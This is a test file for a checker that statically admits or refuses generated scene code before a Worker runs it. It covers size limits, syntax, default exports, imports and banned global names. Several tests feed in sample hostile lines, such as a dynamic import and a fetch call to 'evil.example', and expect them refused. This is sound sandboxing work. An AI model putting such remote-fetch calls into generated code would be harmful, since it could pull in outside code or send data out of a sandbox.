/**
 * Static admission of a generated scene (docs/superpowers/specs/
 * 2026-10-08-creative-control-design.md §8, §12): a corpus of scenes the
 * Worker admits and scenes it refuses, each refusal with the rule it broke
 * and, where the parse knows it, the line and column.
 */
import { describe, expect, it } from 'vitest';
import { admitSceneCode, BANNED_SCENE_NAMES, describeDiagnostic, SCENE_CODE_BYTES } from './scene-admission.mjs';

const GOOD = `export const reportsCompletion = true;

export default function scene(rise) {
  const { lib, theme } = rise;
  const v = lib.vector({ x: 3, y: 2, color: theme.accent, label: 'v' });
  const fetched = { fetch: 1 };
  return {
    cue(name, { instant } = {}) {
      if (name === 'draw') return lib.tween(v, { t: 1 }, { ms: 800, instant }).then(() => rise.done());
    },
    frame(t) {
      lib.clear();
      v.draw(fetched.fetch, rise.size.width, t);
    }
  };
}
`;

const scene = body => `export default function scene(rise) {\n${body}\n  return { frame() {} };\n}\n`;

function refused(code) {
  const verdict = admitSceneCode(code);
  expect(verdict.ok, code).toBe(false);
  return verdict.diagnostics;
}

describe('a scene the Worker admits', () => {
  it('is an ES module with one default export function, and reportsCompletion as a boolean', () => {
    expect(admitSceneCode(GOOD)).toEqual({ ok: true });
  });

  it('may be an arrow function or a function expression, with names that only look like banned ones as property names', () => {
    expect(admitSceneCode('export default rise => ({ frame() {} });')).toEqual({ ok: true });
    expect(admitSceneCode('export default (function (rise) { return { frame() {}, fetch: 1, self: 2 }; });')).toEqual({ ok: true });
    expect(admitSceneCode('class A { fetch() {} self = 1; }\nexport default () => ({ frame() { new A().fetch(); } });')).toEqual({ ok: true });
  });

  it('may be exactly the size limit', () => {
    const head = 'export default () => ({ frame() {} });\n//';
    const code = head + 'x'.repeat(SCENE_CODE_BYTES - head.length);
    expect(new TextEncoder().encode(code).length).toBe(SCENE_CODE_BYTES);
    expect(admitSceneCode(code)).toEqual({ ok: true });
  });
});

describe('a scene the Worker refuses, and why', () => {
  it('refuses code over the size limit, counted in UTF-8 bytes', () => {
    const code = `export default () => ({ frame() {} });\n//${'界'.repeat(SCENE_CODE_BYTES / 3)}`;
    const [diagnostic] = refused(code);
    expect(diagnostic).toMatchObject({ rule: 'size', line: null, column: null });
    expect(diagnostic.message).toContain('24,576 bytes');
  });

  it('refuses code that is not text', () => {
    expect(refused(42)[0].rule).toBe('size');
  });

  it('refuses a syntax error with the parse’s line and column, counted from one', () => {
    const [diagnostic, ...rest] = refused('export default function () {\n  return {;\n}');
    expect(rest).toEqual([]);
    expect(diagnostic).toEqual({ line: 2, column: 11, rule: 'syntax', message: 'the code does not parse as a module: Unexpected token' });
    expect(describeDiagnostic(diagnostic)).toBe('line 2, column 11: the code does not parse as a module: Unexpected token.');
  });

  it('refuses code nested too deeply to parse, and never throws on it', () => {
    const deep = `export default () => ({ frame() {} });\nconst x = ${'['.repeat(12_000)}${']'.repeat(12_000)};`;
    expect(refused(deep)[0]).toMatchObject({ rule: 'syntax', line: 2 });
  });

  it('refuses `with`, which a module’s strict mode does not parse', () => {
    const [diagnostic] = refused(scene('  with (Math) { PI; }'));
    expect(diagnostic).toMatchObject({ rule: 'syntax', line: 2, column: 3 });
    expect(diagnostic.message).toContain("'with'");
  });

  it('refuses a module with no default export', () => {
    const [diagnostic] = refused('export function scene() { return { frame() {} }; }');
    expect(diagnostic).toMatchObject({ rule: 'default-export', line: null });
    expect(diagnostic.message).toMatch(/one default export function/u);
  });

  it('refuses a default export that is not a function, or one that cannot return the scene at once', () => {
    for (const code of [
      'export default { frame() {} };',
      'export default class Scene {}',
      'const scene = () => ({ frame() {} });\nexport { scene as default };',
      'const scene = () => ({ frame() {} });\nexport { scene as "default" };',
      'export default async function scene() { return { frame() {} }; }',
      'export default function* scene() {}'
    ]) {
      const [diagnostic] = refused(code);
      expect(diagnostic.rule, code).toBe('default-export');
      expect(diagnostic.line, code).toBeGreaterThan(0);
    }
  });

  it('refuses an import declaration, an export from another module, and a dynamic import()', () => {
    const imported = refused(`import { x } from './x.js';\n${scene('')}`);
    expect(imported[0]).toMatchObject({ rule: 'import', line: 1, column: 1 });
    expect(refused(`export * from './x.js';\n${scene('')}`)[0].rule).toBe('import');
    expect(refused(`export { y } from './x.js';\n${scene('')}`)[0].rule).toBe('import');
    const dynamic = refused(scene("  import('https://evil.example/x.js');"));
    expect(dynamic[0]).toMatchObject({ rule: 'import', line: 2, column: 3 });
  });

  it('refuses `debugger`', () => {
    expect(refused(scene('  debugger;'))[0]).toMatchObject({ rule: 'debugger', line: 2, column: 3 });
  });

  it('refuses a call to fetch, at the name, in the words the model is told', () => {
    const [diagnostic] = refused(scene("  fetch('https://evil.example');"));
    expect(diagnostic).toMatchObject({ rule: 'banned-name', line: 2, column: 3 });
    expect(describeDiagnostic(diagnostic)).toMatch(/^line 2, column 3: `fetch` is not available to a scene/u);
  });

  it('refuses self.postMessage, globalThis.x, setTimeout, and every other banned name', () => {
    expect(refused(scene("  self.postMessage('x');")).map(item => item.message.split('`')[1])).toEqual(['self']);
    expect(refused(scene('  globalThis.x = 1;'))[0]).toMatchObject({ rule: 'banned-name', line: 2, column: 3 });
    expect(refused(scene('  setTimeout(() => {}, 10);'))[0].message).toMatch(/^`setTimeout`/u);
    expect(refused(scene("  postMessage('x');"))[0].message).toMatch(/^`postMessage`/u);
    for (const name of BANNED_SCENE_NAMES) {
      expect(refused(scene(`  const x = ${name};`))[0].message, name).toMatch(new RegExp(`^\`${name}\``, 'u'));
    }
  });

  it('refuses a banned name wherever it is a name, a local one included, and says so', () => {
    for (const body of ['  const fetch = 1;', '  const { fetch } = rise.lib;', '  const x = { fetch };', '  function eval2(Function) {}', '  rise.lib[window] = 1;']) {
      const [diagnostic] = refused(scene(body));
      expect(diagnostic.rule, body).toBe('banned-name');
      expect(diagnostic.message, body).toContain('even as a local name');
    }
  });

  it('refuses a reportsCompletion that is not a boolean literal', () => {
    for (const value of ['1', "'true'", 'null', 'Boolean(1)', '!0']) {
      const [diagnostic] = refused(`export const reportsCompletion = ${value};\n${scene('')}`);
      expect(diagnostic, value).toMatchObject({ rule: 'reports-completion', line: 1 });
    }
    for (const exported of ['reportsCompletion', '"reportsCompletion"']) {
      const renamed = refused(`const done = true;\nexport { done as ${exported} };\n${scene('')}`);
      expect(renamed[0].rule, exported).toBe('reports-completion');
    }
  });

  it('reports every problem in source order, at most ten', () => {
    const many = scene(Array.from({ length: 30 }, () => '  fetch();').join('\n'));
    const diagnostics = refused(many);
    expect(diagnostics).toHaveLength(10);
    expect(diagnostics.map(item => item.line)).toEqual([2, 3, 4, 5, 6, 7, 8, 9, 10, 11]);
    const mixed = refused(`import x from 'y';\n${scene('  debugger;\n  fetch();')}`);
    expect(mixed.map(item => item.rule)).toEqual(['import', 'debugger', 'banned-name']);
  });
});
